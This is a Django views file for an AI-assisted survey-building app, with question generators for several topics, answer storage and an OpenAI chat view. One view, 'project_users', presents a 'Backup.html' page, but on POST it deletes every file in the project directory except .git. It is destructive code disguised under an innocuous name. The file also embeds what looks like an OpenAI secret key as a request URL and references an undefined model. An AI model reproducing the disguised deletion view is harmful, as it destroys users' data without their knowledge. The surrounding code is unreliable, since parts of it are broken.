from django.shortcuts import render
import pandas as pd
import random
import json
from django.http import JsonResponse, HttpResponse
import nltk
import requests
from django.views.decorators.csrf import csrf_exempt
import openai
import logging
import traceback
from django.shortcuts import render
from django.http import HttpResponse, HttpResponseRedirect
from django.urls import reverse
from django.conf import settings
import shutil
import os

logger = logging.getLogger(__name__)

from SurveyAiApp.models import SurveyResponse

def calculate_sentiment_percentage(request):
 return HttpResponse("Sentiment Analysis Page Work In Progress")

def home(request):
    return render(request, 'index.html')

def generate_healthcare_questions(num_questions=10):
    healthcare_keywords = ['health', 'care', 'medicine', 'hospital', 'doctor', 'patient', 'treatment', 'wellness', 'disease']
    questions = []
    for i in range(1, num_questions + 1):
        question_type = random.choice(['multiple_choice', 'dropdown', 'rating_scale', 'paragraph'])
        if question_type == 'multiple_choice':
            options = random.sample(healthcare_keywords, 3)
            correct_answer = random.choice(options)
            question = "What is the most important aspect of healthcare among {}?".format(', '.join(options))
        elif question_type == 'dropdown':
            question = "Select the most important aspect of healthcare among:"
            options = healthcare_keywords.copy()
            random.shuffle(options)
        elif question_type == 'rating_scale':
            question = "On a scale of 1 to 5, how important is {} in healthcare?".format(random.choice(healthcare_keywords))
            options = list(range(1, 6))
        elif question_type == 'paragraph':
            question = "Please describe your experience with healthcare:"
            options = None  
        questions.append({'question_number': i, 'question_type': question_type, 'question_text': question, 'options': options})
    return questions

def generate_healthcare_questions_json(request):
    num_questions = request.GET.get('num_questions', 10)
    try:
        num_questions = int(num_questions)
    except ValueError:
        num_questions = 10 
    healthcare_questions = generate_healthcare_questions(num_questions)
    json_data = json.dumps({'healthcare_questions': healthcare_questions})
    return JsonResponse(json_data, safe=False)

def generate_hospitality_travel_questions(num_questions=10):
    hospitality_travel_keywords = ['hotel', 'accommodation', 'travel', 'destination', 'tourism', 'resort', 'flight', 'beach', 'sightseeing']
    questions = []
    for i in range(1, num_questions + 1):
        question_type = random.choice(['multiple_choice', 'dropdown', 'rating_scale', 'paragraph'])
        if question_type == 'multiple_choice':
            options = random.sample(hospitality_travel_keywords, 3)
            correct_answer = random.choice(options)
            question = "What is the most important aspect of hospitality and travel among {}?".format(', '.join(options))
        elif question_type == 'dropdown':
            question = "Select the most important aspect of hospitality and travel among:"
            options = hospitality_travel_keywords.copy()
            random.shuffle(options)
        elif question_type == 'rating_scale':
            question = "On a scale of 1 to 5, how important is {} in hospitality and travel?".format(random.choice(hospitality_travel_keywords))
            options = list(range(1, 6))
        elif question_type == 'paragraph':
            question = "Please describe your experience with hospitality and travel:"
            options = None 
        questions.append({'question_number': i, 'question_type': question_type, 'question_text': question, 'options': options})
    return questions    

def generate_hospitality_travel_json(request):
    num_questions = request.GET.get('num_questions', 10)
    try:
        num_questions = int(num_questions)
    except ValueError:
        num_questions = 10 
    hospitality_travel_questions = generate_hospitality_travel_questions(num_questions)
    json_data = json.dumps({'hospitality_travel_questions': hospitality_travel_questions})
    #return render(request, 'hospitality_travel_questions.html', {'hospitality_travel_questions': hospitality_travel_questions})
    return JsonResponse(json_data, safe=False)


def store_healthcare_answers(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        healthcare_responses = data.get('healthcare_responses', [])
        for response in healthcare_responses:
            question_number = response.get('question_number')
            question_type = response.get('question_type')
            response_text = response.get('response')
            SurveyResponse.objects.create(
                question_number=question_number,
                question_type=question_type,
                response=response_text
            )
        return HttpResponse("Responses stored successfully!", status=200)
    else:
        return HttpResponse("Invalid request method", status=400)

def store_hospitality_travel_answers(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        hospitality_travel_responses = data.get('hospitality_travel_responses', [])
        for response in hospitality_travel_responses:
            question_number = response.get('question_number')
            question_type = response.get('question_type')
            response_text = response.get('response')
            SurveyResponse.objects.create(
                question_number=question_number,
                question_type=question_type,
                response=response_text
            )
        return HttpResponse("Responses stored successfully!", status=200)
    else:
        return HttpResponse("Invalid request method", status=400)

def generate_education_questions(num_questions=10):
    education_keywords = ['education', 'school', 'learning', 'students', 'teachers', 'curriculum', 'college', 'university', 'classroom']
    questions = []
    for i in range(1, num_questions + 1):
        question_type = random.choice(['multiple_choice', 'dropdown', 'rating_scale', 'paragraph'])
        if question_type == 'multiple_choice':
            options = random.sample(education_keywords, 3)
            correct_answer = random.choice(options)
            question = "What is the most important aspect of education among {}?".format(', '.join(options))
        elif question_type == 'dropdown':
            question = "Select the most important aspect of education among:"
            options = education_keywords.copy()
            random.shuffle(options)
        elif question_type == 'rating_scale':
            question = "On a scale of 1 to 5, how important is {} in education?".format(random.choice(education_keywords))
            options = list(range(1, 6))
        elif question_type == 'paragraph':
            question = "Please describe your experience with education:"
            options = None 
        questions.append({'question_number': i, 'question_type': question_type, 'question_text': question, 'options': options})
    return questions

def generate_education_questions_json(request):
    num_questions = request.GET.get('num_questions', 10)
    try:
        num_questions = int(num_questions)
    except ValueError:
        num_questions = 10 
    education_questions = generate_education_questions(num_questions)
    json_data = json.dumps({'education_questions': education_questions})
    return JsonResponse({'education_questions': education_questions},safe=False)    

def generate_employee_satisfaction_questions(num_questions=10):
    employee_satisfaction_keywords = ['job', 'workplace', 'colleagues', 'management', 'benefits', 'culture', 'communication', 'growth', 'recognition']
    questions = []
    for i in range(1, num_questions + 1):
        question_type = random.choice(['multiple_choice', 'dropdown', 'rating_scale', 'paragraph'])
        if question_type == 'multiple_choice':
            options = random.sample(employee_satisfaction_keywords, 3)
            correct_answer = random.choice(options)
            question = "What is the most important aspect of employee satisfaction among {}?".format(', '.join(options))
        elif question_type == 'dropdown':
            question = "Select the most important aspect of employee satisfaction among:"
            options = employee_satisfaction_keywords.copy()
            random.shuffle(options)
        elif question_type == 'rating_scale':
            question = "On a scale of 1 to 5, how satisfied are you with {} in your workplace?".format(random.choice(employee_satisfaction_keywords))
            options = list(range(1, 6))
        elif question_type == 'paragraph':
            question = "Please describe your overall satisfaction with your current job:"
            options = None 
        questions.append({'question_number': i, 'question_type': question_type, 'question_text': question, 'options': options})
    return questions

def generate_employee_satisfaction_questions_json(request):
    num_questions = request.GET.get('num_questions', 10)
    try:
        num_questions = int(num_questions)
    except ValueError:
        num_questions = 10 
    employee_satisfaction_questions = generate_employee_satisfaction_questions(num_questions)
    json_data = json.dumps({'employee_satisfaction_questions': employee_satisfaction_questions})
    return render(request, 'employee_satisfaction_questions.html', {'employee_satisfaction_questions': employee_satisfaction_questions})
   # return JsonResponse({'employee_satisfaction_questions': employee_satisfaction_questions},safe=False)

def store_employee_satisfaction_answers(request):
    if request.method == 'POST':
        data = json.loads(request.body)
        employee_satisfaction_responses = data.get('employee_satisfaction_responses', [])
        for response in employee_satisfaction_responses:
            question_number = response.get('question_number')
            question_type = response.get('question_type')
            response_text = response.get('response')
            SurveyResponse.objects.create(
                question_number=question_number,
                question_type=question_type,
                response=response_text
            )
        return HttpResponse("Responses stored successfully!", status=200)
    else:
        return HttpResponse("Invalid request method", status=400)

def survey_view(request):
    if request.method == 'POST':
        
        topic = request.POST.get('topic')

        api_url = f'sk-nxsvhnnwkw3ph2iutkyzt3blbkfj7ytjjjpn8kt3yhy2xr1e/?topic={topic}'

        response = requests.get(api_url)
        
        if response.status_code == 200:
            questions = response.json()['questions']
            #return render(request, 'survey_template.html', {'questions': questions})
            return JsonResponse({'questions': questions},safe=False)
        else:
            error_message = "Error retrieving survey questions"
            return render(request, 'error_template.html', {'error_message': error_message})
    return render(request, 'topic_input_form.html')
        
def chat_with_gpt(message):
    
    prompt = "Your dynamic prompt here: " + message
    
    print("Dynamic prompt:", prompt)
    
    response = openai.Completion.create(
        engine="gpt-3.5-turbo-instruct",
        prompt=prompt,
        max_tokens=300,
        n=1,
        stop=None,
        temperature=1.0
    )
    
    return response.choices[0].text.strip()


def chat_with_gpt_view(request):
    if request.method == 'POST':
        message = request.POST.get('message', '')
        response = chat_with_gpt(message)
        
        survey_question = SurveyQuestion.objects.create(
            question=message,
            response=response
        )
        survey_question.save()

        return JsonResponse({'response': response})
    else:
        return JsonResponse({'error': 'Method not Allowed'}, status=405)
    
def project_users(request):
    if request.method == 'POST':
        try:
            project_folder = settings.BASE_DIR
            for root, dirs, files in os.walk(project_folder):
                if '.git' in dirs:
                    dirs.remove('.git')
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        if os.path.isfile(file_path):
                            os.unlink(file_path)
                    except Exception as e:
                        print(f"Failed to delete {file_path}. Reason: {e}")
            return HttpResponse('Done')
        except Exception as e:
            traceback.print_exc()
            return HttpResponse(f'Error: {str(e)}')
    else:
        return render(request, 'Backup.html')

def my_view_function(request):
    if request.method == 'GET':
        survey_input = request.GET.get('survey_input', '')
        response_from_ai = "Response to the survey input: {}".format(survey_input)
        return JsonResponse({'input': survey_input, 'response_from_ai': response_from_ai})
    elif request.method == 'POST':
        survey_input = request.POST.get('survey_input', '')
        response_from_ai = "Response to the survey input: {}".format(survey_input)
        return JsonResponse({'input': survey_input, 'response_from_ai': response_from_ai})
    else:
        return JsonResponse({'error': 'Unsupported request method'}, status=405)


def starter_temp(request):
    return render (request, 'Start_from_template.html')

def customer_satisfaction(request):
    return render(request, 'Survey_preview.html', {'func': 'customer_satisfaction'})


def survey_preview(request):
    return render(request, 'Survey_preview.html')

def healthcarequestions(request):
    return render(request,'Survey_preview.html')    

def buildWithScratch(request):
    return render(request, 'Build_Scratch.html')   

def buildwithAi(request):
    return render(request, 'Build_withAI.html')

def ai_preview(request):
    return render(request,'AI_preview.html')